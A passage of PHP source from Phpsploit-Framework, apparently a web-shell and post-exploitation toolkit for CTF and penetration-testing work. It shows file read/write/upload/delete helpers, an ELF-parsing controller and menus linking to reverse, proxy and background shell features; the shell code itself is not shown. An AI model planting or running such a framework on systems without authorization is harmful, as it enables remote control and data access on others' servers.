            if ( $_file_size !== false ) {
                $_file_info[ "size" ] = $_file_size;
            }
            $_file_perms = fileperms ( $file_path );
            if ( $_file_perms !== false ) {
                $_oct_perms = decoct ( $_file_perms );
                if ( $_oct_perms !== false ) {
                    $_file_info[ "perms" ] = substr ( $_oct_perms , -4 , 4 );
                }
            }
            $_file_group = filegroup ( $file_path );
            if ( $_file_group !== false ) {
                $_file_group_info      = posix_getgrgid ( $_file_group );
                $_file_info[ "group" ] = $_file_group_info;
            }
            $_file_owner = fileowner ( $file_path );
            if ( $_file_owner !== false ) {
                $_file_owner_info      = posix_getpwuid ( $_file_owner );
                $_file_info[ "owner" ] = $_file_owner_info;
            }
            $_file_atime = fileatime ( $file_path );
            if ( $_file_atime !== false ) {
                $_file_info[ "atime" ] = $_file_atime;
            }
            $_file_mtime = filemtime ( $file_path );
            if ( $_file_mtime !== false ) {
                $_file_info[ "mtime" ] = $_file_mtime;
            }
            $_file_inode = fileinode ( $file_path );
            if ( $_file_inode !== false ) {
                $_file_info[ "inode" ] = $_file_inode;
            }
            $_file_ctime = filectime ( $file_path );
            if ( $_file_ctime !== false ) {
                $_file_info[ "ctime" ] = $_file_ctime;
            }
            $_file_point = fopen ( $file_path , "r" );
            if ( $_file_point !== false ) {
                if ( $file_content_read_offset < 0 ) {
                    $file_content_read_offset = 0;
                }
                if ( $file_content_read_offset >= $_file_info[ "size" ] ) {
                    $file_content_read_offset                 = $_file_info[ "size" ];
                    $_file_info[ "content_read_offset" ]      = $file_content_read_offset;
                    $_file_info[ "content_read_next_offset" ] = 0;
                    $_file_info[ "content_read_remain" ]      = 0;
                    $_file_info[ "content" ]                  = "";
                    $_file_info[ "content_size" ]             = 0;
                    @fclose ( $_file_point );
                    return $_file_info;
                }
                $_file_info[ "content_read_offset" ]      = $file_content_read_offset;
                $_file_info[ "content_read_next_offset" ] = ( $_file_info[ "content_read_offset" ] + $_file_info[ "content_read_limit" ] );
                if ( $_file_info[ "content_read_next_offset" ] >= $_file_info[ "size" ] ) {
                    $_file_info[ "content_read_next_offset" ] = $_file_info[ "size" ];
                    $_file_info[ "content_read_remain" ]      = 0;
                } else {
                    $_file_info[ "content_read_remain" ] = ( $_file_info[ "size" ] - ( $_file_info[ "content_read_next_offset" ] ) );
                }
                fseek ( $_file_point , $_file_info[ "content_read_offset" ] , SEEK_SET );
                $_file_content = fread ( $_file_point , $_file_info[ "content_read_limit" ] );
                if ( $_file_content === false ) {
                    @fclose ( $_file_point );
                    throw new \Exception( "Error reading file content" , 0 );
                }
                if ( $data_type == Class_Base_Format::TYPE_DATA_BIN ) {
                    $_file_info[ "content" ]      = Class_Base_Format::get_format_hex_content ( $_file_content );
                    $_file_info[ "content_size" ] = Class_Base_Format::get_format_hex_content_size ( $_file_info[ "content" ] );
                } else {
                    $_file_info[ "content" ]      = $_file_content;
                    $_file_info[ "content_size" ] = strlen ( $_file_content );
                }
                @fclose ( $_file_point );
            }
        }
        return $_file_info;
    }

    public static function get_file_full_name_info ( $file_full_name )
    {
        $_file_full_name_info = array ( "filename" => null , "extension" => null );
        if ( is_string ( $file_full_name ) ) {
            if ( strlen ( $file_full_name ) > 0 ) {
                $_file_full_name_items              = explode ( chr ( 46 ) , $file_full_name );
                $_file_full_name_info[ "filename" ] = $_file_full_name_items[ 0 ];
                if ( count ( $_file_full_name_items ) > 1 ) {
                    $_file_full_name_info[ "extension" ] = $_file_full_name_items[ 1 ];
                }
            }
        }
        return $_file_full_name_info;
    }

    public static function exist_file_type ( $file_path , $file_types = array ( self::TYPE_FILE_TEXT , self::TYPE_FILE_APPLICATION , self::TYPE_FILE_IMAGE , self::TYPE_FILE_AUDIO , self::TYPE_FILE_VIDEO ) )
    {
        if ( ( ! file_exists ( $file_path ) ) ) {
            throw new \Exception( "file is not exist , file_path : " . $file_path , 0 );
        }
        $_file_type        = mime_content_type ( $file_path );
        $_file_type_items  = explode ( "/" , $_file_type );
        $_file_common_type = $_file_type_items[ 0 ];
        if ( in_array ( strtolower ( $_file_common_type ) , $file_types ) ) {
            return true;
        }
        return false;
    }

    public static function parent_directory ( $file_path )
    {
        if ( Class_Base_Format::is_directory ( $file_path ) || Class_Base_Format::is_file ( $file_path ) ) {
            $_parent_directory = dirname ( $file_path );
            return $_parent_directory;
        }
        return false;
    }

    public static function get_file_name ( $file_path )
    {
        $_file_name = false;
        if ( Class_Base_Format::is_directory ( $file_path ) || Class_Base_Format::is_file ( $file_path ) ) {
            $file_path                     = str_replace ( "\\" , "/" , $file_path );
            $_last_path_delimiter_position = strrpos ( $file_path , "/" );
            if ( $_last_path_delimiter_position === false ) {
                $_file_name = $file_path;
            } else if ( $_last_path_delimiter_position == ( strlen ( $file_path ) - 1 ) ) {
                $_file_name = "";
            } else {
                $_file_name = substr ( $file_path , ( $_last_path_delimiter_position + 1 ) );
            }
        }
        return $_file_name;
    }

    public static function pathinfo ( $file_path )
    {
        if ( ! is_string ( $file_path ) ) {
            return false;
        }
        if ( strlen ( $file_path ) < 1 ) {
            return false;
        }
        $file_path = str_replace ( "\\" , "/" , $file_path );
        if ( ( $file_path == "." ) || ( $file_path == ".." ) ) {
            return false;
        }
        $_pathinfo                     = array ( "dirname" => null , "basename" => null , "extension" => null , "filename" => null );
        $_last_path_delimiter_position = strrpos ( $file_path , "/" );
        if ( $_last_path_delimiter_position === false ) {
            $file_path = ( chr ( 46 ) . "/" . $file_path );
        }
        $_full_file_name         = substr ( $file_path , $_last_path_delimiter_position );
        $_pathinfo[ "basename" ] = $_full_file_name;
        $_last_path_dot_position = strrpos ( $_full_file_name , "." );
        if ( $_last_path_dot_position !== false ) {
            $_full_file_name_items    = explode ( "." , $_full_file_name );
            $_pathinfo[ "filename" ]  = $_full_file_name_items[ 0 ];
            $_pathinfo[ "extension" ] = $_full_file_name_items[ 1 ];
        } else {
            $_pathinfo[ "filename" ] = $_full_file_name;
        }
        $_pathinfo[ "dirname" ] = substr ( $file_path , 0 , $_last_path_delimiter_position );
        return $_pathinfo;
    }

    public static function create_file ( $current_directory_path , $file_name , $data_type , $file_content , $file_size_limit = Class_Base_File::SIZE_FILE_CONTENT_LIMIT , $debug = 0 )
    {
        if ( $data_type == self::TYPE_DATA_BIN ) {
            $file_content = trim ( $file_content , chr ( 10 ) );
            $file_content = trim ( $file_content , chr ( 13 ) );
            $file_content = trim ( $file_content , chr ( 9 ) );
            $file_content = trim ( $file_content , chr ( 32 ) );
        }
        $_file_content_length = strlen ( $file_content );
        if ( is_string ( $current_directory_path ) && ( strlen ( $current_directory_path ) > 0 ) && is_string ( $file_name ) && ( strlen ( $file_name ) > 0 ) && is_string ( $file_content ) && ( $_file_content_length > 0 ) && ( $_file_content_length <= $file_size_limit ) && ( is_integer ( $data_type ) ) && ( in_array ( $data_type , array ( Class_Base_Format::TYPE_DATA_TEXT , Class_Base_Format::TYPE_DATA_BIN ) ) ) ) {
            $current_directory_path = str_replace ( "\\" , "/" , $current_directory_path );
            $file_name              = Class_Base_Format::filter_file_name_special_symbols ( str_replace ( "/" , "_" , str_replace ( "\\" , "/" , $file_name ) ) );
            $_file_name_length      = strlen ( $file_name );
            $_dot_position          = strrpos ( $file_name , chr ( 46 ) );

            if ( $_dot_position === false ) {
                $file_name .= ( $file_name . ( chr ( 46 ) . time () . chr ( 46 ) . "phpsploit" ) );
            } else if ( $_dot_position === ( $_file_name_length - 1 ) ) {
                if ( $_file_name_length == 1 ) {
                    $file_name .= ( time () . chr ( 46 ) . "phpsploit" );
                } else {
                    $file_name .= ( substr ( $file_name , 0 , ( $_file_name_length - 1 ) ) . ( chr ( 46 ) . time () . chr ( 46 ) . "phpsploit" ) );
                }
            } else {
                $_extend_name = substr ( $file_name , ( $_dot_position + 1 ) , ( $_file_name_length - ( $_dot_position + 1 ) ) );
                $file_name    = ( substr ( $file_name , 0 , ( $_dot_position ) ) . chr ( 46 ) . time () . chr ( 46 ) . "phpsploit" . chr ( 46 ) . $_extend_name );
            }
            if ( substr ( $file_name , 0 , 1 ) == "." ) {
                $file_name = ( time () . chr ( 46 ) . $file_name );
            }
            if ( $current_directory_path == "/" ) {
                $_file_path = $current_directory_path . $file_name;
            } else {
                if ( substr ( $current_directory_path , ( strlen ( $current_directory_path ) - 1 ) , 1 ) == "/" ) {
                    $_file_path = $current_directory_path . $file_name;
                } else {
                    $_file_path = $current_directory_path . "/" . $file_name;
                }
            }
            $_file_content_size = Class_Base_Format::get_bin_content_size ( $file_content , $data_type );
            $_file_content      = Class_Base_Format::get_bin_content ( $file_content , $data_type );
            if ( $_file_content_size != strlen ( $_file_content ) ) {
                throw new \Exception( "Inconsistent calculation results of data content size" , 0 );
            }
            if ( ! file_exists ( $_file_path ) ) {
                $_mode       = ( ( $data_type == Class_Base_Format::TYPE_DATA_BIN ) ? "wb" : "w" );
                $_file_point = fopen ( $_file_path , $_mode );
                if ( ! empty( $_file_point ) ) {
                    $_file_write_length = fwrite ( $_file_point , $_file_content , $file_size_limit );
                    fclose ( $_file_point );
                    if ( ! empty( $_file_write_length ) ) {
                        $_return = array ( "file_path" => $_file_path , "content_size" => $_file_content_size , "content_write_size" => $_file_write_length , "content_remain_size" => ( $_file_content_size - $_file_write_length ) );
                        return $_return;
                    }
                }
            }
        }
        return null;
    }

    public static function update_file ( $file_path , $file_content , $data_type , $file_size_limit = Class_Base_File::SIZE_FILE_CONTENT_LIMIT , $debug = 0 )
    {
        if ( file_exists ( $file_path ) && is_file ( $file_path ) && Class_Base_File::is_permission ( $file_path ) ) {
            $_file_content_size = Class_Base_Format::get_bin_content_size ( $file_content , $data_type );
            $_file_content      = Class_Base_Format::get_bin_content ( $file_content , $data_type );
            if ( $_file_content_size != strlen ( $_file_content ) ) {
                throw new \Exception( "Inconsistent calculation results of data content size" , 0 );
            }
            if ( $_file_content_size <= 0 ) {
                throw new \Exception( "The data content size cannot be empty" , 0 );
            }
            if ( $_file_content_size > $file_size_limit ) {
                throw new \Exception( "The data content size has exceeded the writable limit" , 0 );
            }
            $_mode       = ( ( $data_type == Class_Base_Format::TYPE_DATA_BIN ) ? "wb" : "w" );
            $_file_point = fopen ( $file_path , $_mode );
            if ( ! empty( $_file_point ) ) {
                $_file_write_length = fwrite ( $_file_point , $_file_content , $file_size_limit );
                fclose ( $_file_point );
                if ( ! empty( $_file_write_length ) ) {
                    $_return = array ( "file_path" => $file_path , "content_size" => $_file_content_size , "content_write_size" => $_file_write_length , "content_remain_size" => ( $_file_content_size - $_file_write_length ) );
                    return $_return;
                }
            }
        }
        return false;
    }

    public static function delete_file ( $file_path , $file_size_limit = Class_Base_File::SIZE_FILE_CONTENT_LIMIT , $debug = 0 )
    {
        if ( is_string ( $file_path ) && ( strlen ( $file_path ) > 0 ) && self::is_permission ( $file_path ) ) {
            $_file_size = self::get_file_size ( $file_path );
            if ( $_file_size > $file_size_limit ) {
                throw new \Exception( 'The volume size ( ' . $_file_size . ' byte )  of the current file exceeds the maximum volume size ( ' . $file_size_limit . ' byte ) limit for file deletion. Unable to successfully delete file ( ' . $file_path . ')' , Class_Base_Error::FILE_EXCEPTION_DELETE );
            }
            $_parent_directory  = dirname ( $file_path );
            $_file_type         = self::get_file_type ( $file_path );
            $_delete_start_time = time ();
            $_deleted           = @unlink ( $file_path );
            if ( empty( $_deleted ) ) {
                return false;
            }
            $_delete_end_time  = time ();
            $_delete_exec_time = ( $_delete_end_time - $_delete_start_time );
            $_return           = array ( "file_path" => $file_path , "parent_directory" => $_parent_directory , "file_type" => $_file_type , "file_size" => $_file_size , "file_size_limit" => $file_size_limit , "deleted" => $_deleted , "delete_start_time" => $_delete_start_time , "delete_end_time" => $_delete_end_time , "delete_exec_time" => $_delete_exec_time , );
            return $_return;

        }
        return false;
    }

    public static function get_file_content ( $file_path , $data_type , &$content_remain_read_size = 0 , $limit_read_size = Class_Base_File::SIZE_FILE_CONTENT_LIMIT )
    {
        if ( file_exists ( $file_path ) && is_file ( $file_path ) ) {
            if ( ! is_integer ( $data_type ) ) {
                throw new \Exception( ( "data_type is not a integer number , data_type : " . print_r ( $data_type , true ) ) , 0 );
            }
            if ( ( ! in_array ( $data_type , array ( Class_Base_Format::TYPE_DATA_TEXT , Class_Base_Format::TYPE_DATA_BIN ) ) ) ) {
                throw new \Exception( ( "data_type is not within the valid range , data_type : " . print_r ( $data_type , true ) ) , 0 );
            }
            $_file_size = self::get_file_size ( $file_path );
            if ( $_file_size !== false ) {
                if ( $_file_size > $limit_read_size ) {
                    $content_remain_read_size = ( $_file_size - $limit_read_size );
                }
                $_mode = "r";
                if ( $data_type == Class_Base_Format::TYPE_DATA_BIN ) {
                    $_mode = "rb";
                }
                $_file_point = fopen ( $file_path , $_mode );
                if ( ! empty( $_file_point ) ) {
                    $_file_content = fread ( $_file_point , $limit_read_size );
                    fclose ( $_file_point );
                    $_file_content_length = strlen ( $_file_content );
                    if ( $data_type !== false ) {
                        $_return_content = "";
                        if ( $data_type == Class_Base_Format::TYPE_DATA_BIN ) {
                            for ( $index = 0 ; $index < $_file_content_length ; $index++ ) {
                                $_return_content .= ( '\x' . ( str_pad ( dechex ( ord ( substr ( $_file_content , $index , 1 ) ) ) , 2 , '0' , STR_PAD_LEFT ) ) );
                            }
                        } else {
                            $_return_content = $_file_content;
                        }
                        return $_return_content;
                    }
                }
            }
        }
        return false;
    }

    public static function get_file_content_size ( $file_content , $data_type = self::TYPE_DATA_BIN )
    {
        if ( ! is_string ( $file_content ) ) {
            throw new \Exception( "The file content is not a valid string" , 0 );
        }
        if ( strlen ( $file_content ) > 1024 * 1024 * 10 ) {
            throw new \Exception( "The data volume is too large to calculate the data size in real-time" , 0 );
        }
        $_file_content_size = Class_Base_Format::get_bin_content_size ( $file_content , $data_type );
        return $_file_content_size;
    }

    public static function is_permission ( $file_path )
    {
        if ( file_exists ( $file_path ) && ( is_file ( $file_path ) ) ) {
            $_path_info = pathinfo ( $file_path );
            if ( ! array_key_exists ( "extension" , $_path_info ) ) {
                return false;
            }
            if ( $_path_info[ "extension" ] == "phpsploit" ) {
                return true;
            }
            $_file_name              = $_path_info[ "filename" ];
            $_last_path_dot_position = strrpos ( $_file_name , chr ( 46 ) );
            if ( $_last_path_dot_position === false ) {
                return false;
            }
            $_file_name_items       = explode ( chr ( 46 ) , $_file_name );
            $_file_name_items_count = count ( $_file_name_items );
            if ( $_file_name_items_count <= 1 ) {
                return false;
            }
            $_extend_name = $_file_name_items[ $_file_name_items_count - 1 ];
            if ( $_extend_name == "phpsploit" ) {
                return true;
            }
        }
        return false;
    }

    public static function check_permission ( $file_path )
    {
        if ( ! self::is_permission ( $file_path ) ) {
            throw new \Exception( "Insufficient access permissions, you cannot perform operations on the current file (" . strval ( $file_path ) . ")!" , 0 );
        }
    }

    public static function upload ( $form_file_field_name , $save_directory_path , $limit_file_size = self::SIZE_FILE_CONTENT_LIMIT , $limit_file_types = array ( self::TYPE_FILE_TEXT , self::TYPE_FILE_APPLICATION , self::TYPE_FILE_IMAGE , self::TYPE_FILE_AUDIO , self::TYPE_FILE_VIDEO ) )
    {
        if ( ( is_string ( $form_file_field_name ) && ( strlen ( $form_file_field_name ) > 0 ) ) && ( is_string ( $save_directory_path ) && ( strlen ( $save_directory_path ) > 0 ) ) ) {
            if ( ( ! empty( $_FILES[ $form_file_field_name ] ) ) && ( is_array ( $_FILES[ $form_file_field_name ] ) ) ) {
                if ( ( array_key_exists ( "error" , $_FILES[ $form_file_field_name ] ) ) && ( is_integer ( $_FILES[ $form_file_field_name ][ "error" ] ) ) && ( $_FILES[ $form_file_field_name ][ "error" ] > 0 ) ) {
                    throw new \Exception( "upload file , error code : " . $_FILES[ $form_file_field_name ][ "error" ] , 0 );
                }
                if ( ( ! empty( $_FILES[ $form_file_field_name ][ "name" ] ) ) && ( ! empty( $_FILES[ $form_file_field_name ][ "type" ] ) ) && ( ! empty( $_FILES[ $form_file_field_name ][ "size" ] ) ) && ( ! empty( $_FILES[ $form_file_field_name ][ "tmp_name" ] ) ) ) {
                    if ( ! is_uploaded_file ( $_FILES[ $form_file_field_name ][ "tmp_name" ] ) ) {
                        throw new \Exception( "The file upload method is illegal, access is prohibited! Temporary file path : " . $_FILES[ $form_file_field_name ][ "tmp_name" ] , 0 );
                    }
                    if ( ! self::exist_file_type ( $_FILES[ $form_file_field_name ][ "tmp_name" ] , $limit_file_types ) ) {
                        throw new \Exception( "The upload file type is not within the acceptable range. Current upload file type : " . $_FILES[ $form_file_field_name ][ "type" ] , 0 );
                    }
                    if ( $_FILES[ $form_file_field_name ][ "size" ] > $limit_file_size ) {
                        throw new \Exception( "The size of the uploaded file exceeds the upload limit , The current uploaded file size is : " . $_FILES[ $form_file_field_name ][ "size" ] , 0 );
                    }
                    $_file_full_name_info = self::get_file_full_name_info ( $_FILES[ $form_file_field_name ][ "name" ] );
                    if ( empty( $_file_full_name_info ) || ( ! is_array ( $_file_full_name_info ) ) || ( ! array_key_exists ( "filename" , $_file_full_name_info ) ) || ( ! is_string ( $_file_full_name_info[ "filename" ] ) ) || ( strlen ( $_file_full_name_info[ "filename" ] ) < 1 ) ) {
                        throw new \Exception( "Failed to obtain relevant information about the uploaded file , Current uploaded file name is  : " . $_FILES[ $form_file_field_name ][ "name" ] );
                    }
                    $save_directory_path = str_replace ( "\\" , "/" , $save_directory_path );
                    if ( ( ! file_exists ( $save_directory_path ) ) || ( ! is_dir ( $save_directory_path ) ) ) {
                        throw new \Exception( "The file save directory path you set does not exist , Please check and reset the file save directory path , The current file save directory path is set to : " . $save_directory_path , 0 );
                    }
                    $_file_name = Class_Base_Format::filter_file_name_special_symbols ( $_file_full_name_info[ "filename" ] );
                    if ( ( ! is_string ( $_file_name ) ) || ( strlen ( $_file_name ) <= 0 ) ) {
                        $_file_name = "file_create_time_" . time ();
                    }
                    $_extend_name = $_file_full_name_info[ "extension" ];
                    if ( substr ( $save_directory_path , ( strlen ( $save_directory_path ) - 1 ) , 1 ) != "/" ) {
                        $save_directory_path .= "/";
                    }
                    if ( $_FILES[ $form_file_field_name ][ "error" ] == UPLOAD_ERR_OK ) {
                        $_file_save_path = $save_directory_path . $_file_name . chr ( 46 ) . time () . chr ( 46 ) . "phpsploit" . ( ( ( ! is_string ( $_extend_name ) ) || ( strlen ( $_extend_name ) < 1 ) ) ? "" : ( chr ( 46 ) . $_extend_name ) );
                        if ( file_exists ( $_file_save_path ) ) {
                            throw new \Exception( "The target file already exists and cannot be overwritten ! Target file : " . $_file_save_path , 0 );
                        }
                        $_move_success = move_uploaded_file ( $_FILES[ $form_file_field_name ][ "tmp_name" ] , $_file_save_path );
                        if ( empty( $_move_success ) ) {
                            throw new \Exception( "Failed to save the uploaded file ! Upload file save path : " . $_file_save_path , 0 );
                        }
                        $_file_info   = self::get_file_info ( $_file_save_path , 0 );
                        $_file_object = self::get_new_object ( $_file_info );
                        return $_file_object;
                    }
                }
            }
        }
        return null;
    }

    public static function get_new_object ( $file_info )
    {
        $_object = new Class_Base_File( $file_info );
        return $_object;
    }

    public function __construct ( $file_info )
    {
        if ( is_array ( $file_info ) && ( ! empty( $file_info ) ) ) {
            foreach ( $file_info as $key => $item ) {
                $this->{$key} = $item;
            }
        }
    }

    public function __destruct ()
    {
        // TODO: Implement __destruct() method.
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Shell_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "web_shell" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/shell/web_shell" , array () ) ,
                ) ,
                array (
                    "title"    => "server_shell" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/shell/server_shell" , array () ) ,
                ) ,
                array (
                    "title"    => "server_shell_client" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/shell/server_shell_client" , array () ) ,
                ) ,
                array (
                    "title"    => "reverse_shell" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/shell/reverse_shell" , array () ) ,
                ) ,
                array (
                    "title"    => "background_shell" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/shell/background_shell" , array () ) ,
                ) ,
                array (
                    "title"    => "proxy_shell" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/shell/proxy_shell" , array () ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Top
{
    private static $_top = null;

    public static function top ()
    {
        if ( empty( self::$_top ) ) {
            self::$_top = array (
                "lang"       => "en" ,
                "charset"    => "utf-8" ,
                "title"      => "phpsploit-framework" ,
                "javascript" => ( Class_Base_Security::get_js_encode_source_code () . Class_Base_Security::get_js_base64_source_code () . Class_Base_Security::get_js_urldecode () ) ,
                "menu"       => array (
                    array (
                        "title"    => "home" ,
                        "describe" => "home" ,
                        "href"     => Class_Base_Response::get_url ( "/index" , array () ) ,
                    ) ,
                    array (
                        "title"    => "guide" ,
                        "describe" => "guide" ,
                        "href"     => Class_Base_Response::get_url ( "/guide" , array () ) ,
                    ) ,
                    array (
                        "title"    => "security" ,
                        "describe" => "security" ,
                        "href"     => Class_Base_Response::get_url ( "/security" , array () ) ,
                    ) ,
                    array (
                        "title"    => "memory" ,
                        "describe" => "memory" ,
                        "href"     => Class_Base_Response::get_url ( "/memory" , array () ) ,
                    ) ,
                    array (
                        "title"    => "database" ,
                        "describe" => "database" ,
                        "href"     => Class_Base_Response::get_url ( "/database" , array () ) ,
                    ) ,
                    array (
                        "title"    => "file" ,
                        "describe" => "file" ,
                        "href"     => Class_Base_Response::get_url ( "/file" , array () ) ,
                    ) ,
                    array (
                        "title"    => "scan" ,
                        "describe" => "scan" ,
                        "href"     => Class_Base_Response::get_url ( "/scan" , array () ) ,
                    ) ,
                    array (
                        "title"    => "wget" ,
                        "describe" => "wget" ,
                        "href"     => Class_Base_Response::get_url ( "/wget" , array () ) ,
                    ) ,
                    array (
                        "title"    => "elf" ,
                        "describe" => "elf" ,
                        "href"     => Class_Base_Response::get_url ( "/elf" , array () ) ,
                    ) ,
                    array (
                        "title"    => "shell" ,
                        "describe" => "shell" ,
                        "href"     => Class_Base_Response::get_url ( "/shell" , array () ) ,
                    ) ,
                    array (
                        "title"    => "chat" ,
                        "describe" => "chat" ,
                        "href"     => Class_Base_Response::get_url ( "/chat" , array () ) ,
                    ) ,
                    array (
                        "title"    => "report" ,
                        "describe" => "report" ,
                        "href"     => Class_Base_Response::get_url ( "/report" , array () ) ,
                    ) ,
                    array (
                        "title"    => "clear" ,
                        "describe" => "clear" ,
                        "href"     => 'javascript:if(confirm("Are you sure you want to reset the software data of Phpsploit Framework? After resetting, shared memory and session data will be destroyed! If you want to continue using the Phpsploit Framework software, you need to perform the initialization operation of the Phpsploit Framework software again! Note: The files you downloaded, uploaded, and created will not be deleted together. If you want to clean these files, you need to manually perform the cleaning work of these files! Reminder: Files downloaded, uploaded, or created using the Phpsploit Framework software usually contain the word \'phpsploit\' in the file name, which usually appears with a prefix name separated by a period before the file extension! If the downloaded, uploaded, or created file does not have an extension, the word \'phpsploit\' will directly appear as a file extension! This type of naming design is mainly designed to facilitate your management of files downloaded, uploaded, and created using the Phpsploit Framework software. Execute clear (select \'OK\'), discard clear (select \'Cancel\').")){document.location.href="' . Class_Base_Response::get_url ( "/clear" , array ( "rand" => time () ) ) . '";}' ,
                    ) ,
                    array (
                        "title"    => "logout" ,
                        "describe" => "logout" ,
                        "href"     => 'javascript:if(confirm("Are you sure you want to log out? After logging out, if you want to use the Phpsploit Framework software again, you need to use the currently created account, password, and command board to log in again! Before officially logging out, it is recommended that you take note of your current account, password, command board, and other information! This can avoid the dilemma of not being able to log in again after logging out! If you forget your password after logging out, you can also contact the authorized party who authorizes you to conduct penetration testing or security audit behavior, and cooperate with them to uninstall the Phpsploit Framework software (this usually requires you to execute the \"php -f <Phpsploit Framework software project file path> /clear\" operation in the command line environment of the target machine to uninstall the Phpsploit Framework software)! Execute clear (select \'OK\'), discard clear (select \'Cancel\').")){document.location.href="' . Class_Base_Response::get_url ( "/logout" , array () ) . '";}' ,                        //
                    ) ,
                ) ,
                "content"    => '<div style="line-height:32px;font-size:32px;text-align: center;">phpsploit-framework</div><div style="height:32px;"></div>' ,
            );
        }

        foreach ( self::$_top[ "menu" ] as $index => $menu ) {
            if ( PHP_VERSION_ID < 80000 ) {
                if ( $menu[ "title" ] == "elf" ) {
                    self::$_top[ "menu" ][ $index ] = null;
                    unset( self::$_top[ "menu" ][ $index ] );
                }
                if ( $menu[ "title" ] == "chat" ) {
                    self::$_top[ "menu" ][ $index ] = null;
                    unset( self::$_top[ "menu" ][ $index ] );
                }
            }
            if ( ! Class_Base_Extension::exist_enabled_extensions ( Class_Base_Extension::EXTENSION_NAME_SHMOP ) ) {
                if ( $menu[ "title" ] == "memory" ) {
                    self::$_top[ "menu" ][ $index ] = null;
                    unset( self::$_top[ "menu" ][ $index ] );
                }
            }
            try {
                if ( $menu[ "title" ] == "guide" ) {
                    if ( ( ! class_exists ( "Class_Controller_PenetrationTestCommands" ) ) || ( ! class_exists ( "Class_Controller_PenetrationTestCommands" ) ) ) {
                        self::$_top[ "menu" ][ $index ] = null;
                        unset( self::$_top[ "menu" ][ $index ] );
                    }
                }
            } catch ( \Exception $e ) {
                if ( $menu[ "title" ] == "guide" ) {
                    self::$_top[ "menu" ][ $index ] = null;
                    unset( self::$_top[ "menu" ][ $index ] );
                }
            }
        }

        return self::$_top;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-3
 * Time: 下午4:00
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_Elf
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top ::top ();
            $_body   = array (
                "menu"    => Class_View_Elf_Menu ::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function elf64 ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_start      = Class_Base_Request ::form ( "start" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_file_path  = Class_Base_Request ::form ( "file_path" , Class_Base_Request::TYPE_STRING , "" );
        $_elf64_info = array ();
        if ( ( ! empty( $_start ) ) && ( strlen ( $_file_path ) > 0 ) && ( file_exists ( $_file_path ) ) && ( is_file ( $_file_path ) ) ) {
            $_elf64_info = Class_Base_Elf64 ::get_file_info ( $_file_path );
        }
        if ( ! is_cli () ) {
            $_cli_url        = Class_Base_Response ::get_cli_url ( "/elf/elf64" , array ( 'start' => 1 , 'file_path' => $_file_path , ) );
            $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">ELF 64 Format File Data Info</div>';
            $_form_top       .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This interface is used to obtain and parse the specified binary executable file content. For the binary security part of CTF competitions, as well as penetration testing and software security audit activities, this interface function can provide very powerful assistance capabilities.</div>';
            $_form_top       .= '<div style="margin-top: 16px;text-align:left;font-size:18px;"><span style="font-size: 18px;color:red;">cli url : ' . ( Class_Base_Format ::htmlentities ( $_cli_url ) ) . '</span></div>';
